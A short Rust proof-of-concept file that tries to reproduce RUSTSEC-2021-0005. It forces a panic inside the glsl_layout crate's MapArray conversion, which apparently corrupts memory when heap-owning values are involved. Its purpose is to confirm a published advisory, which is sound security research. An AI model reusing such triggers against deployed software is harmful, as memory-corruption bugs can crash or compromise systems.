//! Root-cause witness attempt for RUSTSEC-2021-0005.
//!
//! Rudra-PoC 0106 records only an intentional panic and states that no PoC was
//! created. This source exercises the cited `MapArray` conversion with a
//! heap-owning value whose safe `Into<f32>` conversion panics.

#![forbid(unsafe_code)]

use glsl_layout::vec2;

struct DropDetector(#[allow(dead_code)] Box<u64>);

impl From<DropDetector> for f32 {
    fn from(_value: DropDetector) -> Self {
        panic!("published MapArray conversion panic point")
    }
}

fn main() {
    let _: vec2 = [DropDetector(Box::new(1)), DropDetector(Box::new(2))].into();
}
